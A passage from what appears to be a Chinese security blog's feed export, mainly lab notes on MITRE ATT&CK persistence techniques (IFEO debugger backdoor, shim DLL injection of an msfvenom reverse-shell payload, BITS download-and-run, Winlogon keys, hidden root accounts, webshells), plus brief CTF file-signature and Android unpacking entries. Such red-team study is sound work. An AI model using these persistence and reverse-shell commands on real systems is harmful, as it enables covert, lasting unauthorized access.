$Value = &quot;C:\windows\system32\cmd.exe&quot;
$Name = &quot;Debugger&quot;
IF(!(Test-Path $registryPath))
 {
  New-Item -Path $registryPath -Force
  New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
 }
ELSE
 {
  New-ItemProperty -Path $registryPath -Name $name -Value $Value
 }</code></pre><p><span id="jump2">清除命令</span></p>
<pre><code>reg delete &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot; /v Debugger /f</code></pre><p><strong>防御</strong></p>
<ol>
<li>查看注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options下是否存在可疑项</li>
<li>查看C盘下是否存在可疑的可执行后门文件</li>
<li>查看进程是否存在可疑进程</li>
<li>监控可执行文件和执行命令</li>
</ol>
<h3 id="0x22-T1098-windows-Admin-Account-Manipulate（管理员账户操作）"><a href="#0x22-T1098-windows-Admin-Account-Manipulate（管理员账户操作）" class="headerlink" title="0x22 T1098-windows Admin Account Manipulate（管理员账户操作）"></a>0x22 T1098-windows Admin Account Manipulate（管理员账户操作）</h3><ol>
<li>账户被操作，会影响管理员的维护与某些权限的访问。操作有：修改权限，修改登录密码，添加或删除用户或用户组，修改原用户配置、系统配置等等操作。</li>
<li>powershell（管理员权限）终端<a href="#jump3">执行代码</a>，报错可能是版本问题（2.0 没有Get-CIMInstance），或者字符串格式问题等</li>
<li>$PSVersionTable #查看版本，2.0</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/9.png" alt></li>
<li><a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=30653" target="_blank" rel="noopener">先安装Microsoft .NET Framework 4.5</a></li>
<li><a href="https://docs.microsoft.com/en-us/powershell/scripting/install/installing-windows-powershell?view=powershell-6" target="_blank" rel="noopener">更新powershell版本</a></li>
<li>再看看版本：$PSVersionTable，5.1</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/10.png" alt></li>
<li>再<a href="#jump3">执行代码</a></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/12.png" alt></li>
<li>Administrator已被重命名</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/13.png" alt></li>
<li>手动改名（改回），右击我的电脑——管理——本地用户和组——用户——刚改的名字——右击——重命名——xxx</li>
</ol>
<p><span id="jump3">原脚本</span></p>
<pre><code>$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w

$hostname = (Get-CIMInstance CIM_ComputerSystem).Name

$fmm = Get-CimInstance -ClassName win32_group -Filter &quot;name = &#39;Administrators&#39;&quot; | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

foreach($member in $fmm) {
    if($member -like &quot;*Administrator*&quot;) {
        Rename-LocalUser -Name $member.Name -NewName &quot;HaHaHa_$x$y$z$w&quot;
        Write-Host &quot;Successfully Renamed Administrator Account on&quot; $hostname
        }
    }</code></pre><h3 id="0x23-T1138-windows-Application-Shimming-Attack（直译：应用程序匀速攻击）"><a href="#0x23-T1138-windows-Application-Shimming-Attack（直译：应用程序匀速攻击）" class="headerlink" title="0x23 T1138-windows Application Shimming Attack（直译：应用程序匀速攻击）"></a>0x23 T1138-windows Application Shimming Attack（直译：应用程序匀速攻击）</h3><ol>
<li>Microsoft为了解决与新windows操作系统的旧应用程序不兼容的问题，发布了应用程序兼容性工具包ACT，属于<a href="https://docs.microsoft.com/en-gb/windows-hardware/get-started/adk-install" target="_blank" rel="noopener">windows评估和部署工具包ADK</a>的一部分。</li>
<li>该工具包含一个“injectdll”的修复程序，可用于将DLL注入应用程序达到持久控制的作用。</li>
<li>msfvenom生成反弹shell的dll后门程序</li>
<li>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=4444 -f dll&gt;test.dll</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/14.png" alt></li>
<li><a href="https://docs.microsoft.com/zh-cn/windows-hardware/get-started/adk-install" target="_blank" rel="noopener">Microsoft Application Compatibility Toolkit</a></li>
<li>启动应用程序兼容性工具包</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/16.png" alt></li>
<li>选择一个已安装的应用程序</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/17.png" alt></li>
<li>可用的针对32位应用程序的兼容性修补程序有369个，选择injectdll，使用刚使用msfvenom生成的dll文件注入Firefox。</li>
<li>点击Parameters，设置dll文件的位置</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/18.png" alt></li>
<li>save，保存为test.sdb</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/15.png" alt></li>
<li>可在Microsoft Application Compatibility Toolkit中直接选择安装</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/24.png" alt></li>
<li>sdbinst.exe（默认位于c:\windows\system32下）是用于部署自定义数据库文件的应用程序，也可以使用<a href="https://github.com/evil-e/sdb-explorer" target="_blank" rel="noopener">sdb-explorer</a>来安装程序</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/19.png" alt></li>
<li>该应用程序已安装在系统</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/20.png" alt></li>
<li>shim数据库文件已被复制到windows目录下</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/21.png" alt></li>
<li>msfconsole启动监听</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/22.png" alt></li>
<li>服务器启动Firefox，msf就获取到meterpreter会话了。</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/23.png" alt></li>
<li><strong>除了生成.sdb文件，还可以直接创建新的shim数据库文件，powershell执行命令</strong></li>
<li>Copy-Item …….\*.sdb C:\Windows\apppatch\Custom\*.sdb</li>
<li>Copy-Item …….\*.sdb C:\Windows\apppatch\Custom64\*.sdb</li>
<li>清除命令</li>
<li>Remove-Item C:\Windows\apppatch\Custom\*.sdb</li>
<li>Remove-Item C:\Windows\apppatch\Custom64\*.sdb</li>
<li><strong>还可以修改注册表，powershell执行命令</strong></li>
<li>New-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom” -Name “test” -Value “test”</li>
<li>New-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB” -Name “test” -Value “test”</li>
<li>清除命令</li>
<li>Remove-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom” -Name “test”</li>
<li>Remove-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB” -Name “test”</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/25.png" alt></li>
</ol>
<p><strong>参考</strong><br><a href="https://pentestlab.blog/2019/12/16/persistence-application-shimming/" target="_blank" rel="noopener">https://pentestlab.blog/2019/12/16/persistence-application-shimming/</a><br><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/" target="_blank" rel="noopener">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/</a><br><a href="https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1138/T1138.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1138/T1138.md</a></p>
<h3 id="0x24-T1197-windows-BITS-Jobs-Windows后台智能传输服务"><a href="#0x24-T1197-windows-BITS-Jobs-Windows后台智能传输服务" class="headerlink" title="0x24 T1197-windows BITS Jobs (Windows后台智能传输服务)"></a>0x24 T1197-windows BITS Jobs (Windows后台智能传输服务)</h3><ol>
<li>BITS (后台智能传送服务) 是一个Windows组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</li>
<li>攻击者可能会运行恶意代码后滥用BITS进行下载，执行甚至清理文件，这些危险操作，可能防火墙是允许的。</li>
<li>使用bitsadmin.exe执行命令</li>
<li>bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}</li>
<li>清除命令</li>
<li>del #{local_file}</li>
<li><strong>powershell执行</strong></li>
<li>Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}</li>
<li><strong>例子</strong></li>
<li>bitsadmin.exe /transfer /Download /priority Foreground <a href="http://192.168.100.3/1.txt" target="_blank" rel="noopener">http://192.168.100.3/1.txt</a> f:\test\11.txt</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/43.png" alt></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/44.png" alt></li>
<li>清除命令</li>
<li>Remove-Item #{local_file}</li>
<li>多步下载执行脚本</li>
<li>bitsadmin.exe /create #{bits_job_name}</li>
<li>bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}</li>
<li>bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}</li>
<li>bitsadmin.exe /complete AtomicBITS</li>
<li>bitsadmin.exe /resume #{bits_job_name}</li>
</ol>
<h3 id="0x25-T1004-windows-winlogon"><a href="#0x25-T1004-windows-winlogon" class="headerlink" title="0x25 T1004-windows winlogon"></a>0x25 T1004-windows winlogon</h3><ol>
<li>winlogon.exe是windows NT用户登录程序，用于管理用户登录、注销以及ctrl+alt+delete触发的secure attention sequence。</li>
<li>位置：C:\Windows\System32</li>
<li>注册表：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon</li>
<li>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</li>
</ol>
<p><strong>winlogon shell Key Persistence（持久性）</strong></p>
<ol>
<li>Set-ItemProperty “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; “Shell” “explorer.exe, [要执行的程序]” -Force</li>
<li><strong>测试：设置命令</strong></li>
<li>powershell执行：Set-ItemProperty “HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; “Shell” “explorer.exe, c:\windows\system32\notepad.exe” -Force</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/26.png" alt></li>
<li>重启，同时自动启动了notepad.exe</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/27.png" alt></li>
<li><strong>清除命令</strong></li>
<li>Remove-ItemProperty -Path “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name “Shell” -Force</li>
</ol>
<p><strong>Winlogon Userinit Key Persistence（持久性）</strong></p>
<ol>
<li><strong>设置命令</strong></li>
<li>Set-ItemProperty “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; “Userinit” “Userinit.exe, [要执行的程序]” -Force</li>
<li><strong>清除命令</strong></li>
<li>Remove-ItemProperty -Path “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name “Userinit” -Force</li>
</ol>
<p><strong>Winlogon Notify Key Logon Persistence（持久性）</strong></p>
<ol>
<li><strong>设置命令</strong></li>
<li>New-Item “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify” -Force</li>
<li>Set-ItemProperty “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify” “logon” “[要执行的程序]” -Force</li>
<li><strong>清除命令</strong></li>
<li>Remove-Item “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify” -Force</li>
</ol>
<h2 id="0x26-T1042-Change-Default-File-Association-更改默认文件关联"><a href="#0x26-T1042-Change-Default-File-Association-更改默认文件关联" class="headerlink" title="0x26 T1042-Change Default File Association(更改默认文件关联)"></a>0x26 T1042-Change Default File Association(更改默认文件关联)</h2><ol>
<li>打开文件时，将检查用于打开文件的默认程序（文件关联或处理程序）。</li>
<li>文件关联选择储存在windows注册表中，可由用户、管理员或具有注册表访问权限的程序进行编辑，也可由管理员使用内置的assoc实用程序进行编辑。</li>
<li>攻击者可修改给定文件扩展名的文件关联，目的是打开具有给定扩展名的文件时调用指定程序。</li>
<li><strong>例子：</strong></li>
<li>windows下的.txt默认是使用notepad.exe打开</li>
<li>注册表位置：</li>
<li>HKEY_CLASSES_ROOT\txtfile\shell\open\command</li>
<li>HKEY_CLASSES_ROOT\txtfile\shell\print\command</li>
<li>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/28.png" alt></li>
<li><strong>测试：</strong></li>
<li>cmd.exe /c assoc [指定文件扩展名]=”[指定文件类型，即让目标程序来打开]”</li>
<li>新建test.txt文件，内容：更改默认文件关联，改名为test.qwer</li>
<li>直接双击打开是无法打开的</li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/29.png" alt></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/30.png" alt></li>
<li><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/31.png" alt></li>
</ol>
<h2 id="0x30-Linux-and-windows"><a href="#0x30-Linux-and-windows" class="headerlink" title="0x30 Linux and windows"></a>0x30 Linux and windows</h2><h3 id="0x31-T1136-Creat-Account（创建账号）"><a href="#0x31-T1136-Creat-Account（创建账号）" class="headerlink" title="0x31 T1136-Creat Account（创建账号）"></a>0x31 T1136-Creat Account（创建账号）</h3><ol>
<li><p><strong>Linux</strong></p>
</li>
<li><p>创建用户：useradd -M -N -r -s /bin/bash -c 用户备注 [用户名]</p>
</li>
<li><p>删除用户：userdel [用户名]</p>
</li>
<li><p>useradd帮助信息</p>
</li>
<li><p><img src="/ATT-CK%E5%AD%A6%E4%B9%A0/32.png" alt></p>
</li>
<li><p>创建root权限用户：useradd -o -u 0 -g 0 -M -d /root -s /bin/bash [用户名]</p>
</li>
<li><p>echo “[密码]” | passwd –stdin [用户名]</p>
</li>
<li><p>删除用户：userdel [用户名]</p>
</li>
<li><p><strong>windows cmd</strong></p>
</li>
<li><p>创建用户：net user /add [用户名]</p>
</li>
<li><p>删除用户：net user /del [用户名]</p>
</li>
<li><p><strong>windows powershell</strong></p>
</li>
<li><p>创建用户：New-LocalUser -Name [用户名] -NoPassword</p>
</li>
<li><p>删除用户：Remove-LocalUser -Name [用户名]</p>
</li>
</ol>
<h3 id="0x32-T1158-Hidden-Files-and-Directories（隐藏的文件和目录）"><a href="#0x32-T1158-Hidden-Files-and-Directories（隐藏的文件和目录）" class="headerlink" title="0x32 T1158 - Hidden Files and Directories（隐藏的文件和目录）"></a>0x32 T1158 - Hidden Files and Directories（隐藏的文件和目录）</h3><ol>
<li></li>
</ol>
<h2 id="0x40-web-server-OR-application-program"><a href="#0x40-web-server-OR-application-program" class="headerlink" title="0x40 web server OR application program"></a>0x40 web server OR application program</h2><h3 id="0x41-T1100-windows-Linux-web-shell"><a href="#0x41-T1100-windows-Linux-web-shell" class="headerlink" title="0x41 T1100-windows/Linux web shell"></a>0x41 T1100-windows/Linux web shell</h3><ol>
<li>xcopy.exe：copy的扩展，可以把指定的目录连文件和目录结构一起拷贝，但不能拷贝系统文件；</li>
<li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">webshell集合</a></li>
<li>上传或拷贝webshell到服务器：xcopy webshell_file webshell_path</li>
<li>删除：del webshell_file</li>
<li>文件上传漏洞</li>
<li>文件包含漏洞</li>
<li>数据库漏洞</li>
<li>等等</li>
</ol>
<h3 id="0x42-T1176-Browser-Extensions（浏览器扩展）"><a href="#0x42-T1176-Browser-Extensions（浏览器扩展）" class="headerlink" title="0x42 T1176-Browser Extensions（浏览器扩展）"></a>0x42 T1176-Browser Extensions（浏览器扩展）</h3><ol>
<li>浏览器扩展程序或插件是小程序，可通过程序商店下载安装或离线下载安装。</li>
<li>扩展程序通常对浏览器可以访问的内容具有访问权限，恶意扩展程序可以通过伪装成合法扩展程序，用户下载安装恶意扩展程序后容易被攻击，危害用户浏览器的用户信息，甚至系统安全。</li>
<li>常见可安装扩展程序的浏览器：chrome、Firefox等等</li>
</ol>
<h2 id="0x50-privilege-escalation"><a href="#0x50-privilege-escalation" class="headerlink" title="0x50 privilege escalation"></a>0x50 privilege escalation</h2><h3 id="0x51-T1044-File-System-Permissions-Weakness"><a href="#0x51-T1044-File-System-Permissions-Weakness" class="headerlink" title="0x51 T1044 - File System Permissions Weakness"></a>0x51 T1044 - File System Permissions Weakness</h3><ol>
<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1044/T1044.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1044/T1044.md</a></li>
</ol>
<h2 id="0xF0-其他"><a href="#0xF0-其他" class="headerlink" title="0xF0 其他"></a>0xF0 其他</h2><ol>
<li>T1084 Windows Management Instrumentation Event Subscription</li>
<li>T1098 Account Manipulation</li>
<li>T1103 AppInit DLLs</li>
<li>T1038 - DLL Search Order Hijacking</li>
</ol>
<h2 id="0xFE-参考"><a href="#0xFE-参考" class="headerlink" title="0xFE 参考"></a>0xFE 参考</h2><ol>
<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md</a></li>
</ol>
<h2 id="0xFF-帮助附录"><a href="#0xFF-帮助附录" class="headerlink" title="0xFF 帮助附录"></a>0xFF 帮助附录</h2><p><strong>Linux ps</strong></p>
<pre><code>[root@localhost ~]# ps --help all

Usage:
 ps [options]

Basic options:
 -A, -e               all processes
 -a                   all with tty, except session leaders
  a                   all with tty, including other users
 -d                   all except session leaders
 -N, --deselect       negate selection
  r                   only running processes
  T                   all processes on this terminal
  x                   processes without controlling ttys

Selection by list:
 -C &lt;command&gt;         command name
 -G, --Group &lt;GID&gt;    real group id or name
 -g, --group &lt;group&gt;  session or effective group name
 -p, p, --pid &lt;PID&gt;   process id
        --ppid &lt;PID&gt;  parent process id
 -q, q, --quick-pid &lt;PID&gt;
                      process id (quick mode)
 -s, --sid &lt;session&gt;  session id
 -t, t, --tty &lt;tty&gt;   terminal
 -u, U, --user &lt;UID&gt;  effective user id or name
 -U, --User &lt;UID&gt;     real user id or name

  The selection options take as their argument either:
    a comma-separated list e.g. &#39;-u root,nobody&#39; or
    a blank-separated list e.g. &#39;-p 123 4567&#39;

Output formats:
 -F                   extra full
 -f                   full-format, including command lines
  f, --forest         ascii art process tree
 -H                   show process hierarchy
 -j                   jobs format
  j                   BSD job control format
 -l                   long format
  l                   BSD long format
 -M, Z                add security data (for SELinux)
 -O &lt;format&gt;          preloaded with default columns
  O &lt;format&gt;          as -O, with BSD personality
 -o, o, --format &lt;format&gt;
                      user-defined format
  s                   signal format
  u                   user-oriented format
  v                   virtual memory format
  X                   register format
 -y                   do not show flags, show rss vs. addr (used with -l)
     --context        display security context (for SELinux)
     --headers        repeat header lines, one per page
     --no-headers     do not print header at all
     --cols, --columns, --width &lt;num&gt;
                      set screen width
     --rows, --lines &lt;num&gt;
                      set screen height

Show threads:
  H                   as if they were processes
 -L                   possibly with LWP and NLWP columns
 -m, m                after processes
 -T                   possibly with SPID column

Miscellaneous options:
 -c                   show scheduling class with -l option
  c                   show true command name
  e                   show the environment after command
  k,    --sort        specify sort order as: [+|-]key[,[+|-]key[,...]]
  L                   show format specifiers
  n                   display numeric uid and wchan
  S,    --cumulative  include some dead child process data
 -y                   do not show flags, show rss (only with -l)
 -V, V, --version     display version information and exit
 -w, w                unlimited output width

        --help &lt;simple|list|output|threads|misc|all&gt;
                      display help and exit

For more details see ps(1).</code></pre><p><strong>Linux grep</strong></p>
<pre><code>[root@localhost ~]# grep --help
用法: grep [选项]... PATTERN [FILE]...
在每个 FILE 或是标准输入中查找 PATTERN。
默认的 PATTERN 是一个基本正则表达式(缩写为 BRE)。
例如: grep -i &#39;hello world&#39; menu.h main.c

正则表达式选择与解释:
  -E, --extended-regexp     PATTERN 是一个可扩展的正则表达式(缩写为 ERE)
  -F, --fixed-strings       PATTERN 是一组由断行符分隔的定长字符串。
  -G, --basic-regexp        PATTERN 是一个基本正则表达式(缩写为 BRE)
  -P, --perl-regexp         PATTERN 是一个 Perl 正则表达式
  -e, --regexp=PATTERN      用 PATTERN 来进行匹配操作
  -f, --file=FILE           从 FILE 中取得 PATTERN
  -i, --ignore-case         忽略大小写
  -w, --word-regexp         强制 PATTERN 仅完全匹配字词
  -x, --line-regexp         强制 PATTERN 仅完全匹配一行
  -z, --null-data           一个 0 字节的数据行，但不是空行

Miscellaneous:
  -s, --no-messages         suppress error messages
  -v, --invert-match        select non-matching lines
  -V, --version             display version information and exit
      --help                display this help text and exit

输出控制:
  -m, --max-count=NUM       NUM 次匹配后停止
  -b, --byte-offset         输出的同时打印字节偏移
  -n, --line-number         输出的同时打印行号
      --line-buffered       每行输出清空
  -H, --with-filename       为每一匹配项打印文件名
  -h, --no-filename         输出时不显示文件名前缀
      --label=LABEL         将LABEL 作为标准输入文件名前缀
  -o, --only-matching       show only the part of a line matching PATTERN
  -q, --quiet, --silent     suppress all normal output
      --binary-files=TYPE   assume that binary files are TYPE;
                            TYPE is &#39;binary&#39;, &#39;text&#39;, or &#39;without-match&#39;
  -a, --text                equivalent to --binary-files=text
  -I                        equivalent to --binary-files=without-match
  -d, --directories=ACTION  how to handle directories;
                            ACTION is &#39;read&#39;, &#39;recurse&#39;, or &#39;skip&#39;
  -D, --devices=ACTION      how to handle devices, FIFOs and sockets;
                            ACTION is &#39;read&#39; or &#39;skip&#39;
  -r, --recursive           like --directories=recurse
  -R, --dereference-recursive
                            likewise, but follow all symlinks
      --include=FILE_PATTERN
                            search only files that match FILE_PATTERN
      --exclude=FILE_PATTERN
                            skip files and directories matching FILE_PATTERN
      --exclude-from=FILE   skip files matching any file pattern from FILE
      --exclude-dir=PATTERN directories that match PATTERN will be skipped.
  -L, --files-without-match print only names of FILEs containing no match
  -l, --files-with-matches  print only names of FILEs containing matches
  -c, --count               print only a count of matching lines per FILE
  -T, --initial-tab         make tabs line up (if needed)
  -Z, --null                print 0 byte after FILE name

文件控制:
  -B, --before-context=NUM  打印以文本起始的NUM 行
  -A, --after-context=NUM   打印以文本结尾的NUM 行
  -C, --context=NUM         打印输出文本NUM 行
  -NUM                      same as --context=NUM
      --group-separator=SEP use SEP as a group separator
      --no-group-separator  use empty string as a group separator
      --color[=WHEN],
      --colour[=WHEN]       use markers to highlight the matching strings;
                            WHEN is &#39;always&#39;, &#39;never&#39;, or &#39;auto&#39;
  -U, --binary              do not strip CR characters at EOL (MSDOS/Windows)
  -u, --unix-byte-offsets   report offsets as if CRs were not there
                            (MSDOS/Windows)

‘egrep’即‘grep -E’。‘fgrep’即‘grep -F’。
直接使用‘egrep’或是‘fgrep’均已不可行了。
若FILE 为 -，将读取标准输入。不带FILE，读取当前目录，除非命令行中指定了-r 选项。
如果少于两个FILE 参数，就要默认使用-h 参数。
如果有任意行被匹配，那退出状态为 0，否则为 1；
如果有错误产生，且未指定 -q 参数，那退出状态为 2。</code></pre><h2 id="red-team"><a href="#red-team" class="headerlink" title="red team"></a>red team</h2><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming#-lateral-movement" target="_blank" rel="noopener">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming#-lateral-movement</a><br><a href="https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE" target="_blank" rel="noopener">https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE</a><br><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a><br><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit" target="_blank" rel="noopener">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a></p>
]]></content>
      <tags>
        <tag>知识</tag>
        <tag>backdoor</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF之文件格式</title>
    <url>/CTF%E4%B9%8B%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><ol>
<li><img src="/CTF%E4%B9%8B%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/1.jfif" alt></li>
<li>文件格式（或文件类型）是指电脑为了存储信息而使用的对信息的特殊编码方式，是用于识别内部储存的资料。比如有的储存图片，有的储存程序，有的储存文字信息。每一类信息，都可以一种或多种文件格式保存在电脑存储中。每一种文件格式通常会有一种或多种扩展名可以用来识别，但也可能没有扩展名。扩展名可以帮助应用程序识别的文件格式。</li>
</ol>
<h2 id="0x01-16进制文件头"><a href="#0x01-16进制文件头" class="headerlink" title="0x01 16进制文件头"></a>0x01 16进制文件头</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><pre><code>bmp：42 4D
     42 4D 3E

gif：    47 49 46 38（GIF8）
     47 49 46 38 37 61（GIF87a）
     47 49 46 38 39 61（GIF89a）

jpg;jpe;jpeg：FF D8 FF
              FF D8 FF E0 00
              FF D8 FF FE 00

png：89 50 4E
     89 50 4E 47
     89 50 4E 47 0D 0A
     89 50 4E 47 0D 0A 1A 0A

psd：38 42 50 53

psp：7E 42 4B 00

TIF;TIFF：49 20 49

tif;tiff：49 49 2A

tif;tiff：49 49 2A 00

TIF;TIFF：4D 4D 00 2A

tif;tiff：4D 4D 2A

TIF;TIFF：4D 4D 00 2B</code></pre><h3 id="压缩文件"><a href="#压缩文件" class="headerlink" title="压缩文件"></a>压缩文件</h3><pre><code>7z：37 7A BC AF 27 1C

bz;bz2：42 5A 68

BZ2;TAR.BZ2;TBZ2;TB2：42 5A 68

gz;tar;tgz：1F 8B

gz;tgz：1F 8B 08

JAR：4A 41 52 43 53 00

lha：2D 6C 68 35 2D

lha;lzh：[2 byte offset] 2D 6C 68

tar.z：1F 9D 90

z：1F 9D

Z：1F 9D 8C

ZIP：50 4B 03

zip;jar;zipx：50 4B 03 04

zip：50 4B 30 30

Zip：50 4B 30 30 50 4B 03 04</code></pre><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><pre><code>COM, DLL, DRV, EXE, PIF, QTS, QTX, SYS：4D 5A

COM：4D 5A EE

COM：E9 3B 03

elf：7F 45 4C 46 01 01 01 00

exe; dll; drv; vxd; sys; ocx; vbx：4D 5A

exe; dll; drv; vxd; sys; ocx; vbx：4D 5A

exe; com; 386; ax; acm; sys; dll; drv; flt; fon; ocx;   scr; lrc; vxd; cpl; x32：4D 5A</code></pre><h2 id="0xFF"><a href="#0xFF" class="headerlink" title="0xFF"></a>0xFF</h2><ol>
<li><a href="https://blog.csdn.net/qq_41079177/article/details/79221638" target="_blank" rel="noopener">https://blog.csdn.net/qq_41079177/article/details/79221638</a></li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>知识</tag>
      </tags>
  </entry>
  <entry>
    <title>app脱壳</title>
    <url>/app%E8%84%B1%E5%A3%B3/</url>
    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><ol>
<li><a href="https://github.com/DrizzleRisk/drizzleDumper" target="_blank" rel="noopener">脱壳工具</a></li>
<li>adb.exe</li>
<li>安卓模拟器</li>
</ol>
<h2 id="0x01-360壳"><a href="#0x01-360壳" class="headerlink" title="0x01 360壳"></a>0x01 360壳</h2><ol>
<li>查壳</li>
<li><img src="/app%E8%84%B1%E5%A3%B3/1.png" alt></li>
<li>反编译，查看代码</li>
<li><img src="/app%E8%84%B1%E5%A3%B3/2.png" alt></li>
<li>adb.exe connect 127.0.0.1:模拟器专用端口</li>
<li>adb.exe push C:...\drizzleDumper（windows绝对路径） /data/data/drizzleDumper（模拟器的路径，路径随你意）</li>
<li>adb.exe shell</li>
<li>cd /data/data</li>
<li>chmod 777 drizzleDumper</li>
<li>./drizzleDumper <apkagename> </apkagename></li>
<li>失败~ 告辞</li>
</ol>
<h2 id="0xFF"><a href="#0xFF" class="headerlink" title="0xFF"></a>0xFF</h2><ol>
<li><a href="https://www.52pojie.cn/thread-685918-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-685918-1-1.html</a></li>
<li><a href="https://www.freebuf.com/sectool/105147.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/105147.html</a></li>
</ol>
]]></content>
      <tags>
        <tag>脱壳</tag>
        <tag>app</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计学习2</title>
    <url>/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/</url>
    <content><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol>
<li>留言</li>
</ol>
<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2>]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>File-Upload</title>
    <url>/File-Upload/</url>
